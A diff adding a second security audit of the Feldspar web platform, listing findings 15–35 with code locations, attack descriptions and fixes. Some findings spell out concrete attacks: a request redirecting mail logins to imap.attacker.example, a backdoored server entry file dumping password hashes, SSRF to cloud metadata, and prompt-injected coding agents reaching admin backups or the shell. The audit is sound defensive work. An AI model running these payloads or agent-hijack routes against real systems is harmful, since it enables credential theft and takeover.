@@ -4,6 +4,9 @@ General security review of the Feldspar codebase (branch `security-review`, base
 looking for information leakage, privilege escalation, remote code execution, session hijacking and
 related flaws.
 
+A second review (items 15 onward, base commit `5993840c`) follows the first; see
+"Second review — October 2026" below.
+
 **Method.** Six read-only reviews ran in parallel, one per attack surface: authentication & sessions,
 API authorization, SQL/formula injection, code execution & SSRF, files/uploads/backups, and output
 encoding / live / MCP / webhooks. Nothing was built or executed. Findings marked **(verified)** were
@@ -373,3 +376,514 @@ path, and the CmdStan makefile behaviour (for the Stan filename item).
 3. File serving (#5, #12) and CSRF cookie (#6).
 4. UI login throttle (#7), `users` column guard (#8), OAuth `email_verified` (#9).
 5. Module sandbox (#10, #11), Windows paths (#13), then the low/hardening list.
+
+---
+---
+
+# Second review — October 2026
+
+A second general review of the whole system, on branch `security-review1` at base commit `5993840c`
+(after the fixes for items 1–13 above). Line numbers are as of that commit.
+
+**Method.** Seven read-only reviews ran in parallel: a re-review of fixes 1–13 looking for
+bypasses; payments and LLM credits; rendering, XSS and Astro server rendering; data-access
+authorization (REST, GraphQL, sync, history, live, datasets); code execution and sandboxes; mail,
+outbound network, webhooks and TLS; and privileged surfaces, app-exposed agents and operations.
+Nothing was built or executed. Findings marked **(verified)** were re-checked against the source
+after the reviewer reported them; the others are as reported, with the code path traced by the
+reviewer but no exploit run. Items already in the first review's Low list are not repeated unless
+they turned out worse than stated.
+
+## Summary
+
+| # | Severity | Issue | Status |
+|---|----------|-------|--------|
+| 15 | High | `/upload`, `/download`, `/backup/*` accept an admin session on application hosts | reported |
+| 16 | High | Non-admin file edits become admin-authority server code (Astro entry, build files, LSP binary) | reported |
+| 17 | High | `mail_test_account` sends a shared account's saved password/token to a host the caller picks | reported |
+| 18 | High | Order lines can change between checkout and payment; the paid order delivers the new basket | reported |
+| 19 | Med–High | Repeated trials give unlimited plan roles and LLM credits | reported |
+| 20 | Medium | Exposed agents: anonymous visitors act as the agent's `view_app_user` | reported |
+| 21 | Medium | Exposed agents re-open admin tools (shell, copilot, modules) to app-origin script | reported |
+| 22 | Medium | No rate limit or spending cap on exposed agents; signup unthrottled | reported |
+| 23 | Medium | Formula isolate allows full JS via `constructor`, shared and persistent, no heap limit | reported |
+| 24 | Medium | Astro scaffold publishes rows of every API table to anonymous visitors | reported |
+| 25 | Medium | Prerendered / refreshed Astro pages served to callers the app does not admit | reported |
+| 26 | Medium | Unauthenticated CPU/memory exhaustion through Astro `/_image` | reported |
+| 27 | Medium | `fetch` action with a templated host is an SSRF that returns the response | reported |
+| 28 | Medium | REST create/update and GraphQL delete return rows the caller may not read | reported |
+| 29 | Medium | Offline-sync pull lists the keys of changed rows the caller cannot read | reported |
+| 30 | Medium | Module workers: `__scDbCall` is writable, so any module can capture other calls' tokens | reported |
+| 31 | Medium | `.git` guard checks the spelling of a path, not where it lands (symlinks, `GIT~1`) | reported |
+| 32 | Medium | The "triggered" marker is lost across trigger chains | reported |
+| 33 | Medium | Test-mode / fake payment accounts grant real roles and credits | reported |
+| 34 | Medium | Chargebacks and partial refunds never revoke a purchase's role or credits | reported |
+| 35 | Medium | Polar customers bound to users by email (suspected) | reported |
+| 36+ | Low | See "Second review: Low / hardening" | reported |
+
+Items 15, 16, 20 and 21 are the main new routes to admin authority; 15 and 21 are the same class
+as the first review's #5 (admin session reachable from app-origin script) on routes its fix did not
+cover. 16 is the same class as #4 ("whoever may edit decides what runs") on routes that fix did
+not cover.
+
+---
+
+## Second review: High
+
+### 15. High — admin file and backup routes accept an admin session on application hosts (verified)
+
+- `crates/sc-server/src/router.rs:320,326,338-339` register `/upload/{store}/{*path}`,
+  `/download/{store}/{*path}`, `/backup/create` and `/backup/upload` as real axum routes, matched on
+  every `Host` before `dispatch`/`resolve_app`.
+- `upload` (`:651-664`), `download` (`:722-737`), `create_backup` (`:776-780`) and `upload_backup`
+  (`:837-841`, via `admin_of` `:894-905`) check only `session_user` + `AuthRequirement::admin()`.
+  None calls `admin_host_only` (`:915-929`), which the #5 fix added only to the LSP, agent-chat,
+  observe and fit-progress sockets.
+- Sessions are not bound to the host that issued them (`session_user` `:3433-3450`).
+
+**Attack.** Script running on any application origin — the app's own code (writable by staff
+through coding agents), HTML injection in a Saltcorn-UI app (`'unsafe-inline'`), an agent-written
+preview — while an admin's session cookie reaches that host (shared sign-in on, or simply the admin
+having signed in to that app). The script reads the host's own `__Host-sc_csrf` and calls
+`POST /backup/create`: the response is the whole instance (password hashes, Secret-field key, LLM
+keys, TLS private key). `/download` and `/upload` read and write any file store, including other
+apps' source; `/backup/upload` stages a crafted backup. A second route is `call_api`
+(`sc-core-traits/src/coding/call_api.rs:224-260`, `sc-server/src/requests.rs:70-100`), which sends
+agent-chosen paths through this router: a prompt-injected triggered run whose `view_app_user` is an
+admin can POST `/backup/create`.
+
+**Fix.** Call `admin_host_only` in all four handlers, or put every admin-only real route behind a
+host-guard layer. Longer term, bind each session to the host scope it was issued for and refuse
+app-issued sessions on admin routes; refuse admin paths in `call_api`.
+
+### 16. High — non-admin file edits become admin-authority server code (verified)
+
+The #4 fix stops a non-admin caller from *running* scripts, checks and builds, but not from writing
+the files those later run, nor the Astro server entry that runs on every request.
+
+- `crates/sc-core-traits/src/files.rs:239-255` (`open_to_write`) refuses only `.git`; write access is
+  the store's read floor (`sc-files/src/access.rs:220-233`), public by default (`def.rs:176`). Build
+  output has no owner.
+- **Astro server entry.** `crates/sc-app/src/server_render.rs:12-20,543-568`: `dist/_server/entry.js`
+  runs through `run_code_traced` with admin authority — `db`, `db.sql`, `fs`, `fetch` (unfiltered,
+  `code_fetch.rs:26-30`) and `trigger()` skipping the target's `min_role`
+  (`sc-api/src/code_host/triggers.rs:187`). The bundle is read from the output directory in the file
+  store (`sc-app/src/build.rs:387-397`) and mounted with no build at boot / SIGHUP
+  (`sc-server/src/apps.rs:1300-1316`) and by a coding run's preview (`apps.rs:1113,1131-1146`, from
+  `coding/view_app.rs:265-294`). `may_view_app` is not admin-gated (`coding.rs:508`).
+- **Build inputs.** `package.json`, bundler configs, lockfiles and `node_modules/**` are writable;
+  they run as the server user at the admin's next build or check (`apps.rs:1220-1255`,
+  `build.rs:1021,1324,1408`) or, for `.astro` frontmatter, as admin-authority code after the build.
+- **Language server.** `crates/sc-server/src/lsp.rs:307-333` (`local_server_bin`) prefers the
+  store's own `node_modules/.bin/typescript-language-server`; an overwritten file keeps its exec bit
+  and runs when an admin opens the IDE.
+- Suspected: a repository whose hooks path is inside the working tree lets the agent edit hooks that
+  `commit` (`coding/commit.rs:120-135`) runs.
+
+**Attack.** A staff user with an edit-capable coding agent over an Astro project (the framework's
+intended use; also a triggered run fed injected data, which keeps `may_edit` and `view_app`) writes
+`site/dist/_server/entry.js` returning `await db.sql("select email,password_hash from users")`,
+then calls `view_app goto /`. The result comes back in the snapshot; after the next restart the
+same file serves every anonymous visitor — a persistent backdoor with admin row, file and trigger
+authority.
+
+**Fix.** Below admin (and for triggered runs), refuse writes to the build output directory,
+`node_modules/`, `package.json`, lockfiles and `*.config.*`; never mount an unbuilt `dist/` for a
+non-admin `view_app` (require an admin-built preview); have the LSP use only the server's own
+binary; pass `--no-verify -c core.hooksPath=/dev/null` on agent commits. Longer term, run Astro
+entries at the visitor's authority by default (like `TableHost::viewer_only`) with admin authority
+an explicit per-app opt-in, run builds in the container sandbox, and give stores a separate write
+floor.
+
+### 17. High — `mail_test_account` leaks a shared mail account's credentials (verified)
+
+- `plugins/imap/actions.js:273-300` (`testAccount`) copies every `ACCOUNT_FIELDS` value from the
+  payload, including `imap_host` and `smtp_host`. With `account_id` it loads the saved row through
+  `readable()` (`:92-96`, a *read* check) and fills in only fields the payload left empty or as the
+  sentinel — the passwords — plus, for OAuth accounts, the access and refresh tokens (`:290-292`).
+  Module reads return Secret fields decrypted (`sc-module/src/services.rs:40-42`).
+- Shared accounts (`owner === null`) are readable by every user at or above their `min_role`
+  (`plugins/imap/index.js:193`); `crates/sc-module/tests/imap_ingest.rs:489-492` tests a non-admin
+  doing exactly this.
+
+**Attack.** A user who can read shared account X and run `mail_test_account` posts
+`{"account_id": X, "imap_host": "imap.attacker.example", "smtp_host": "smtp.attacker.example"}`.
+The attacker's server has a valid public certificate, so TLS verification passes; imapflow and
+nodemailer send X's IMAP/SMTP username and password (or the XOAUTH2 token — full mailbox scope for
+Gmail) in the login. One call is enough; the 5/minute limit is irrelevant.
+
+**Fix.** When `account_id` is given and any host, port, security mode or username differs from the
+saved row, do not fill in saved secrets or tokens. Alternatively, allow saved secrets only to the
+owner, or to an admin for a shared account (the rule `mail_oauth_start` uses).
+
+### 18. High — an order's lines can change between checkout and payment
+
+- The lines are priced once when the checkout is made (`plugins/payments/checkout.js:151-182,222`)
+  and stored on the mirror row (`:351-375`). Processing never compares what was paid, or the
+  current lines, with what was charged (`processing.js:232-273,339-346`); only `amount` reaches
+  `pay_events`.
+- The tutorial's ownership rules let the buyer write `order_lines` while the order is `open`
+  (`docs/tutorial-payments.md:101,118`), and it stays open until the `payment.succeeded` trigger
+  runs; `order_paid`, `take_stock` and `deliver_downloads` (`:285-330`) read the live lines.
+
+**Attack.** A guest puts one cheap item in the basket and calls `api.runCheckout({order})`. Before
+paying (a Stripe session lasts up to 24 h) they add expensive items or downloads, or raise
+quantities, through ordinary REST writes, then pay the original total. The webhook marks the order
+paid, takes the stock and creates `downloads` rows for everything now in the basket.
+
+**Fix.** Re-run `chargedLines` at processing time and, on a mismatch, record an issue and a
+mismatch event instead of `payment.succeeded`; or offer a "lock the row at checkout" setting. Put
+the charged lines (with `item`) on `pay_events`. Rewrite the tutorial so `pay_checkout` moves the
+order out of `open` and deliveries come from the charged lines.
+
+### 19. Medium–High — repeated trials give unlimited plan access and credits
+
+`trialing` grants the plan's role (`plugins/payments/plans.js:75,204-217`) and its credit allowance
+for the trial period (`:177-182`), keyed per subscription and period end (`processing.js:214`).
+`prepareCheckout` / `subscriptionLine` (`checkout.js:241-249,329-339`) never check for an earlier
+subscription or trial on the plan. A user subscribes with a trial (card not charged), uses the role
+and the credits, cancels, and subscribes again for a new trial and a new allowance — or opens
+several trial checkouts at once to stack them. The tutorials (`tutorial-payments-credits.md:95`,
+`tutorial-payments-saas.md:220`) configure exactly this. Stripe and Polar do not block repeat
+trials by default. **Fix:** refuse a trial when the user has had any subscription or trial on the
+account (check the mirror, keyed per user); optionally refuse a second live subscription; grant a
+smaller trial allowance, or credits only from the first paid period.
+
+---
+
+## Second review: Medium
+
+### 20. Exposed agents: anonymous visitors act as `view_app_user`
+
+`RunCaller::anonymous()` has `user: None` (`sc-agent/src/agent_trait.rs:413-419`) and is used for
+signed-out askers (`sc-server/src/app_agents.rs:184-220`). `view_app::viewer`
+(`coding/view_app.rs:298-319`) and `call_api::sender` (`call_api.rs:224-235`) read "no user" as
+"nobody is chatting" and fall back to the configured `view_app_user`; neither tool is caller-gated
+(`coding.rs:253,440,479,508`), and `check_exposed_agents` (`sc-app/src/exposed_agents.rs:443-473`)
+does not look at traits. An agent with the `coding` trait and a staff or admin `view_app_user`,
+exposed with `anonymous: true`, lets any visitor `call_api GET /api/<table>` as that account (and,
+for an admin, reach #15). **Fix:** an explicit anonymous marker so `viewer`/`sender` use the public
+identity; or refuse anonymous exposure of agents with `coding`/`admin_copilot`.
+
+### 21. Exposed agents re-open admin-level tools to app-origin script
+
+`{mount}/_agents/...` goes straight to `app_agents::handle` (`router.rs:1614-1619`), gated only by
+the agent's `min_role` (`app_agents.rs:146`, `chat.rs:493-501`). Shell, process, module-install,
+scripts/check and `admin_copilot` are gated on `is_admin(caller)` (`coding.rs:516-545,718-720`;
+`admin_copilot.rs:309-399`), and an admin chatting through an app is a plain `RunCaller::user`. If
+an admin exposes such an agent in an app and is signed in there, any script on that origin can POST
+`/api/_agents/<name>/chat` with the admin's cookie and CSRF token and drive the shell — what the #5
+fix closed for `/admin/agent-chat`. Prompt injection over attacker-written rows works the same way.
+**Fix:** mark app-originated runs so `is_admin` is false for host-code and copilot tools (like
+`triggered`), or refuse to expose agents carrying those traits.
+
+### 22. No rate limit or spending cap on exposed agents
+
+`app_agents.rs` uses no `sc_ratelimit` (limits exist only for login, reset, webhooks, guest
+sessions and custom queries). A turn may take `DEFAULT_MAX_STEPS = 250` model steps
+(`sc-agent/src/agent.rs:175`) with unlimited concurrent turns; credits are optional and cannot apply
+to anonymous callers. Signup (`sc-api/src/rest/mod.rs:1160`) is unthrottled, so `min_role` 80
+agents are open to scripted sign-ups (each also an argon2 hash). A bot can drain the provider budget.
+**Fix:** per-IP and per-owner rate limits and a concurrency cap on `_agents` routes; per-exposure
+daily budgets; lower `max_steps` for anonymous exposures; throttle signup.
+
+### 23. Formula isolate: full JavaScript, shared state, no heap limit (verified; upgrades the first review's template item)
+
+- `crates/sc-expr/src/ast.rs:195,282-293` lowers any member access (static or computed) and any call;
+  `analyze.rs:203-222` validates only ambient (`row`/`user`/…) properties. Nothing refuses
+  `constructor`, `__proto__` or `prototype`, so `` ``.constructor.constructor(`…`)() `` runs
+  arbitrary statements, assignment included.
+- `crates/sc-expr/src/eval.rs:383` builds one long-lived isolate for every formula in the process
+  with `RuntimeOptions::default()`: no heap limit or near-heap-limit callback (the 250 ms watchdog
+  bounds only CPU).
+- Consequences: a formula can permanently replace globals for all later evaluations
+  (`JSON.stringify`, which wraps value-mode results; `Array.prototype.includes`/`some`, which flips
+  ownership formulas on the reified path), stash other evaluations' bindings, or allocate until V8
+  aborts the server.
+- Formulas are admin-authored, and REST/GraphQL/query-string filters never reach the evaluator. The
+  non-admin route is `{{= field }}` re-interpolation (`sc-expr/src/template.rs:382-411`): row data is
+  re-parsed as a template; text mode does no escaping and HTML mode's `escape_html` leaves backticks,
+  so a quote-free payload survives.
+
+**Fix.** Refuse the member names `constructor`, `__proto__` and `prototype` (static, and computed
+values at run time) when lowering; freeze intrinsics after the prelude; give the isolate a heap limit
+with a near-heap-limit callback that recycles it; parse `{{= }}` values from row data as literal text
+or under a schema-validated subset.
+
+### 24. Astro scaffold publishes rows at admin authority (verified)
+
+`plugins/astro/index.js:319-331` generates one page per table with a REST `list` endpoint
+(`sc-app/src/scaffold/context.rs:41,58-61`) that does `db.<table>.limit(50).rows()` — admin
+authority, no `asUser()` — showing four fields (`email` for `users`). Anonymous renders are cached.
+On a public site, `GET /orders` or `/users` returns up to 50 rows the API itself would refuse.
+**Fix:** scaffold `db.<table>.asUser()`, or scaffold only tables whose list endpoint is public with
+no ownership rule, with a comment explaining why.
+
+### 25. Prerendered Astro pages bypass the application's admission check (verified)
+
+`crates/sc-app/src/server_render.rs:465-475` serves static files *and* refreshable prerendered pages
+before `if !req.admitted` (`:478`); `refresh()` re-renders at admin authority with `caller: None`
+(`:251-277`). A members-only site's `prerender = true` or `refresh = true` page that reads tables is
+served to anonymous visitors. **Fix:** for server-rendered apps, serve only non-HTML assets
+(`_astro/*`, `public/`) to non-admitted callers; send prerendered HTML and refreshable pages through
+the same 403.
+
+### 26. Unauthenticated resource exhaustion through `/_image`
+
+`crates/sc-app/src/server_render/images.rs:223-285`, reached before admission
+(`server_render.rs:457-464`): no in-flight dedup or concurrency limit; the `too_many` check and
+`keep` are not atomic, so concurrent requests for distinct `w`/`h`/`f`/`q` all pass, each decoding
+(sources up to 16384²) and Lanczos-resizing on `spawn_blocking` (512 threads); `per_source` is
+decremented on eviction, so the 32-variant cap does not hold. A few hundred parallel requests
+exhaust memory on a small host. **Fix:** a small per-site semaphore and in-flight dedup; count
+variants since mount (never decremented) or accept only the sizes the build emitted (signed);
+lower `MAX_DECODE_SIDE`.
+
+### 27. `fetch` action with a templated host is an SSRF that returns the response
+
+`crates/sc-core-actions/src/fetch.rs:146-205` renders the URL from the event, checks only the
+scheme (`:248-260`) and uses the unrestricted client; the parsed body is the action's result,
+returned to the caller of a directly-run trigger (`:44-47`), and non-2xx errors quote 300 characters
+of the body (`:194-201`). `send_email` applies `is_public` with IP pinning for exactly this reason
+(`sc-email/src/relay.rs:6-10`). With `url = {{ webhook_url }}` (or a payload value) on a trigger a
+user can fire, the user reads `http://169.254.169.254/…` credentials. Needs an admin to template
+the host. **Fix:** when a token falls in the scheme or authority, apply `HostPolicy` +
+`PublicResolver` and check each redirect hop; or refuse tokens before the path at save time (also
+fixes the first review's encoding item).
+
+### 28. Write responses return rows the caller may not read (verified)
+
+`crates/sc-api/src/rest/mod.rs:1252-1266` answers create and update with `client_row(table, row)`
+without a read check; `graphql/mutate.rs:163-192` (`delete`) returns the removed row likewise
+(GraphQL insert/update do check, via `read_back`). An update whose body only resends Secret fields
+as the sentinel changes nothing and returns the row (`rows.rs:960-975`). On a table whose write
+floor is more permissive than its read floor (a public submission form read by staff), a caller who
+meets only the write floor reads any row by id. **Fix:** return the row only if the caller may read
+it (reuse `read_back`); otherwise return the key only.
+
+### 29. Offline-sync pull lists the keys of changed rows the caller cannot read
+
+`crates/sc-api/src/sync/pull.rs:224-258` computes `removed = changed - found`, where `changed`
+(`sc-catalog/src/sync.rs:208-248`, `changed_keys`) is a raw change-log query with no readability
+filter and `found` is access-filtered. Every changed key the caller may not read lands in `removed`:
+a signed-in user with a device learns the existence, keys and change timing of other users' or
+tenants' rows on synced tables (not their contents). **Fix:** emit `removed` only for keys that were
+deleted or previously delivered to this device; at minimum, document it.
+
+### 30. Module workers: host bridge globals are writable (verified; #11 bypass)
+
+`crates/sc-module/src/js/module-host.mjs:255` sets `globalThis.__scDbCall` by plain assignment, and
+`DB_PRELUDE`'s `send` (`sc-expr/src/code.rs:1316`) looks it up on every call. (Code-body isolates
+define it as fixed, `code.rs:3472`; module workers do not.) Any module on a worker can wrap it and
+observe the unguessable tokens of other calls in flight, including admin-triggered ones, and act as
+those callers. **Fix:** define `__scDbCall` and the other host globals `writable: false,
+configurable: false` before any module loads, capture the reference in the prelude, and bind each
+request to the module that owns the call.
+
+### 31. The `.git` guard checks spelling, not where a path lands (#4/#12 bypass)
+
+`crates/sc-files/src/local.rs:107-115` (`resolve_for_write`) applies `in_git_dir` to the path as
+written; `beneath_root` (`:189-235`) only checks the canonical path is under the root, which `.git`
+is. Reads (`check_access`) and the `/files/serve` dot-segment check are also by spelling. A symlink
+in the working tree pointing into `.git` (it can arrive with a pull) makes `.git/config` writable and
+readable again — the original #4 command-execution route. On NTFS with 8.3 names, `GIT~1` also
+misses the check (suspected). **Fix:** after canonicalising, apply `in_git_dir` to the path relative
+to the root on reads and writes; refuse `git~<digits>` segments as git's `core.protectNTFS` does.
+
+### 32. The "triggered" marker is lost across trigger chains (#3)
+
+`RunCaller.triggered` is dropped when tools build a caller context (`run_trigger.rs:139`,
+`insert_row.rs:118`, `update_rows.rs:164`, `write.rs:63`), and `run_agent.rs:180-190` grants
+`RunCaller::system()` from its own `trusted_input` setting without regard to who caused the event.
+A run started from untrusted input can write a row or call a trigger that fires a `trusted_input`
+`run_agent`, which then has shell and module-install tools. Needs such a chain to exist. **Fix:**
+carry an "untrusted origin" flag in the caller context and event; grant `system()` only without it.
+
+### 33. Test-mode and fake payment accounts grant real roles and credits
+
+`plugins/payments/adapters/index.js:36-41` refuses the fake adapter only in `live` mode; processing
+never checks `account.mode` before granting (`processing.js:174-273`). The fake routes are
+unauthenticated (`webhooks.js:254-305`); its portal `change` takes any price (`:126`) and `renew`
+(`:129`) advances to a new period — a new allowance key each click. A production app with a fake
+account (or test-key Stripe account) left enabled on any trigger — the tutorial leaves the fake
+`shop` account enabled (`tutorial-payments.md:377-396`) — hands out roles and unlimited credits.
+**Fix:** fake accounts only behind a server dev flag; test-mode accounts grant nothing unless an
+explicit option is set; warn on the module card.
+
+### 34. Chargebacks and partial refunds never revoke a purchase
+
+`paymentRole` revokes only on `refunded` (`processing.js:245-251`); credits are never revoked
+(`:264-273`, documented); Stripe's `paymentStatus` ignores disputes, so a lost chargeback leaves
+`succeeded` (`adapters/stripe.js:243-259`); `dispute.*` events are only logged. A buyer spends a
+credit pack and charges it back, keeping the role and credits. **Fix:** on a lost dispute or full
+refund, revoke the role and claw back the unspent part of the payment's credit bucket.
+
+### 35. Polar customers bound to users by email (suspected)
+
+Polar checkouts send `customer_email` when the user has no known customer
+(`adapters/polar.js:442-443`); `upsertCustomer` binds a provider customer to the first user that
+names it (`processing.js:133-150,280-282`); `pay_portal` and `pay_charge_saved` trust that binding
+(`subscriptions.js:109-115`, `charge.js:103-117`); signup does not verify email. If Polar finds the
+existing customer by email, an attacker who signs up with a victim's address and buys something
+cheap gets the victim's customer bound to them: portal access (orders, invoices, address,
+subscriptions) and charges to the victim's saved card. Not checked against Polar's behaviour.
+**Fix:** send `external_customer_id = user.id` and bind only when the provider's `external_id`
+matches; re-check ownership before portal or saved-card use.
+
+---
+
+## Second review: Low / hardening
+
+**Files, rendering, cookies**
+
+- **Static directories skip #5 and #12** (`sc-server/src/router.rs:2108-2188`, `serve_static_dir`):
+  inline with the asset type, no `as_user_content`, only `.git` refused (`.env` served). Matters if a
+  static directory overlaps a store that uploads, File fields or non-admin agents write to.
+  Refuse dot segments; refuse such overlaps or apply the user-content treatment.
+- **`secure_cookies` off behind a TLS proxy** (`sc-server/src/config.rs:100-102,322`,
+  `sc-cli/src/main.rs:182-188`): turned on only when Feldspar terminates TLS. Forgetting the flag
+  drops `Secure`, falls back to the tossable `sc_csrf` (undoing #6, and making an anonymous agent
+  owner — a hash of the CSRF cookie, `uploads.rs:223-240` — fixable), and makes reset/invite links
+  `http://`. Turn it on when a trusted proxy sends `X-Forwarded-Proto: https`, or refuse to start.
+- **`/_goal/` open redirect** (`plugins/astro/files/server.mjs:1455-1487`): the local-path test
+  does not reject control characters; `?to=%2F%09%2Fevil.example` yields `Location: /\t/evil.example`,
+  which browsers normalise to `//evil.example`. Low–Medium. Reject control characters and `\`, or
+  require same origin after `new URL(to, origin)`.
+- **Goal / `<Optimise>` analytics poisoning** (`server.mjs:1233-1290,1391-1434`): every cookieless
+  `GET /_goal/<any>` mints a visitor and inserts a conversion. Count only visitors with an exposure,
+  allow only goal names in the build, rate-limit.
+- **Analytics Markdown `javascript:` filter** (`ui/analytics/src/panels/markdown.ts:107-112,186-203`)
+  is bypassed by a leading C0 character; blocked today only by `script-src 'self'`.
+- **Builder canvas HTML injection** (`ui/builder/vendor/saltcorn-builder/components/elements/*.js`,
+  `dangerouslySetInnerHTML` of previews of a table's first row, `ui/saltcorn-ui/src/builder-routes.ts`):
+  row HTML (e.g. through the Markdown plugin) lands in the admin's DOM; script is blocked by the
+  builder CSP, but phishing markup / meta refresh is not. Sandbox or DOMPurify the previews.
+- **Markdown plugin on Saltcorn-UI pages**: because that CSP has `'unsafe-inline'`, the first
+  review's Markdown item is directly exploitable stored XSS for other app users, not merely Low.
+- **Goal-link signing secret** sits in `dist/_server/entry.js`; anyone who can read the source store
+  can sign off-site goal redirects (subsumed by #16's fix).
+
+**Code execution and modules**
+
+- **View-call file and trigger hosts honour a guest-chosen admin authority**
+  (`sc-viewpattern/src/framework.rs:1422-1458`): only the table host is `viewer_only()`;
+  `V1Trigger.run` (`sc-module/src/js/module-host.mjs:3770-3778`) sends no authority, so it runs as
+  admin past the trigger's `min_role`. Shipped patterns only pick admin-configured triggers, but any
+  v1 viewtemplate plugin can read/write any file for an anonymous viewer. Clamp both hosts.
+- **Code-bearing metadata tables can be given non-admin write floors**
+  (`sc-api/src/metadata_tables.rs:36-55`, `schema_edit.rs:2233`): `_fd_triggers`,
+  `_fd_code_libraries`, `_fd_file_stores`, `_fd_modules`, `_fd_model_instances`. Refuse it.
+- **sklearn model state is a pickle** (`plugins/sklearn/feldspar_sklearn/plugin.py:28-41,68-77`):
+  writable only by fits, restore, or the item above. Treat model rows and backups as code; consider
+  an HMAC or `skops`.
+- **Module `table_changes` subscriptions** (`sc-module/src/services.rs:780-826`) deliver every row
+  with Secret fields decrypted and no per-row check — consistent with modules being trusted once
+  installed; document it.
+
+**Mail and webhooks**
+
+- **TNEF allocation** (`plugins/imap/tnef.js:158,167`): `Buffer.alloc(rawSize)` from an
+  attacker's `winmail.dat` (up to 4 GiB) on a shared worker. Cap at a multiple of the compressed size.
+- **No cap on MIME parts per mail** (`plugins/imap/sync.js:334-360`): one file + row per leaf.
+  Cap (e.g. 200) and record the rest in `import_error`.
+- **Module webhook responses** (`sc-server/src/webhooks.rs:140-149`) are served on every host with
+  module-chosen headers and no CSP default; add `sandbox` unless the module sets a CSP; strip
+  `Set-Cookie`.
+- **Payments webhook 404 lists every account name** (`plugins/payments/accounts.js:16-22`,
+  `webhooks.js:31-36,258-262`) to unauthenticated callers. Return a generic 404.
+- **OAuth consent URL** (`sc-server/src/oauth.rs:428-447`) is consumed before the session-user check,
+  so anyone holding the link can make the owner's flow fail.
+
+**Agents and credits**
+
+- **Triggered agent runs are never metered** (`run_agent.rs:183-191`, `driver.rs:549-555`): an
+  exposed `run_agent` trigger with a payload prompt gives a signed-in user free model calls. Charge
+  the event's user.
+- **Concurrent runs push a balance into unlimited debt** (`driver.rs:569-578` reads without
+  reserving). Cap concurrent metered runs per user or reserve an estimate.
+- **`pay_change_subscription` with proration `none`** (`subscriptions.js:24,143-147`) gives free
+  upgrades until renewal; admin-chosen — document or disallow for upgrades.
+- **Anonymous `GET …/_agents/<name>/runs`** (`app_agents.rs:520-531`, `run_store.rs:199-216`) loads
+  every user-less run of the agent, unpaginated, and filters in memory; runs are saved before the
+  model call, so they are cheap to create. Filter in SQL and paginate.
+- **Concurrent turns on one conversation** (`app_agents.rs:293,398-406`): the Running check is not
+  atomic; two POSTs interleave saves and double-spend. Compare-and-set the state.
+- **`prompt_template` does not constrain an exposure**: `chat` defaults to true, and template values
+  are inserted raw. Warn or refuse when both are set.
+
+**Data access**
+
+- **GraphQL `where`/`order_by` on Secret columns — still unfixed** (`sc-api/src/graphql/args.rs:204-233,276-309`):
+  the first review's mitigation note ("protected only by the generated input types") is inaccurate:
+  `graphql/build.rs:282-303` emits inputs for Secret columns. Only `is_null` leaks anything (the
+  column is ciphertext). Route through `filter::queryable_field`.
+- **Undo conflict report** (`sc-api/src/undo.rs:384-397,486-545`) reads the current row in an admin
+  context and returns changed fields' current values, even if the caller can no longer read the row.
+  Gate `Conflict.actual` on a fresh read check.
+
+**Operations**
+
+- **CLI `write_private`** (`sc-cli/src/auth.rs:298-314`): `mode(0o600)` applies only on create; an
+  existing 0644 file (or a symlink) keeps its mode or is followed. Write a temp file with
+  `O_EXCL|O_NOFOLLOW` and rename.
+- **Single-use tokens in request logs** (`sc-server/src/logging.rs:63-69`): `admin-handoff?token=`
+  and OAuth `/complete?token=` are logged at Info. Redact `token=`.
+- **"Clear all" reopens first-user setup** (`sc-server/src/clear_all.rs`, `sc-api/src/admin.rs:76-80`):
+  it deletes every user, after which `createFirstUser` is public on a live server. Keep the clearing
+  admin or require a CLI-issued setup token.
+- **`own_origin` keeps the `Host` header's port** (`router.rs:2727`): harmless unless someone else
+  controls another port on the same host.
+
+---
+
+## Second review: checked and found sound
+
+- **Fixes 1–13**: hold for the paths they named. `host_header_guard` wraps the whole router and links
+  are built only for resolved apps; OAuth start/consent refused on unserved hosts; host-code tools
+  gated at listing and at call; `.git` writes refused on every backend (but see #31); CSRF compare
+  constant-time; every password login (admin, REST, Saltcorn-UI) throttled; the `users` column guard
+  sits in the row layer, so REST, GraphQL, sync push, CSV import, undo/restore, code bodies and
+  actions all inherit it; Deno `file:` loads fenced; backslash and drive paths refused.
+- **Payments**: amounts, currency, credits and role effects computed server-side and frozen on the
+  checkout mirror; HMAC over raw bytes with constant-time compare and 300 s window for Stripe, Polar
+  and fake; provider re-fetch; idempotent events; credits ledger transactional with the user row
+  locked; payment tables admin-write; role ceiling 50, role 1 refused; redirects path-only; guest
+  sessions 244-bit, hashed, app-scoped.
+- **Data access**: reads, embeds, aggregates, sync and history funnel through
+  `read_row_values_as` / `join_guard` / `aggregate_guard` / `RowImage::readable`; ownership checked on
+  existing and merged rows; sync push via `write_as` with device↔user binding and server-issued keys
+  (no id collision); history and undo writes as the caller; dataset reader rewrites each table to
+  the caller's readable rows; live fan-out re-checks old and new images; role convention
+  `role <= min_role` applied consistently.
+- **Rendering**: render cache only for anonymous GETs, keyed by origin/path/query/locale, per-visitor
+  reads mark pages uncacheable, admission before cache lookup; server cookies withheld from pages;
+  Astro runtime escapes text and attributes (`set:html` the only raw path); Rust HTML generation
+  escapes interpolations; admin, IDE and Analytics UIs use no raw-HTML sinks (except the builder,
+  above); CSPs `script-src 'self'` everywhere but Saltcorn-UI and the IDE (documented).
+- **Code execution**: code bodies bounded by wall clock, CPU slice, call budget and heap; authors
+  are admins; workflows, triggers and 223 of 227 admin endpoints `admin()` (the rest auth/status);
+  no YAML/bincode/pickle deserialisation except sklearn state; every `Command::new` call site has
+  admin- or server-chosen arguments.
+- **Mail and network**: lettre encodes CR/LF in headers; SMTP overrides restricted to public,
+  pinned addresses with verified certificates; IMAP connects to the checked address; certificate
+  settings are admin module settings; mail OAuth uses PKCE, single-use state and a binding cookie and
+  never returns tokens; attachment filenames sanitised; ACME names never taken from SNI; secrets shown
+  as a sentinel in the admin UI; logging prints no credentials.
+- **Privileged surfaces**: typed admin endpoints never reachable on app hosts; app agents bind runs
+  to agent, app, mode and owner (no IDOR); exposed triggers default to admin floor; MCP bearer-only
+  with per-call admin re-check; body limits and `row_cap` in place; no regex filter operator.
+
+## Second review: not covered in depth
+
+The full vendored Saltcorn-UI v1 runtime (spot checks only: `safe_href`, `safe_redirect`,
+`sqlsanitize`, eval sites); typed `api.run<Name>()` return projection; Polar's checkout behaviour
+(for #35); browser-specific behaviour was not tested for the `/_goal` redirect.
+
+## Second review: recommended order
+
+1. App-origin access to admin authority: #15 (host guard on admin routes), #21, #20.
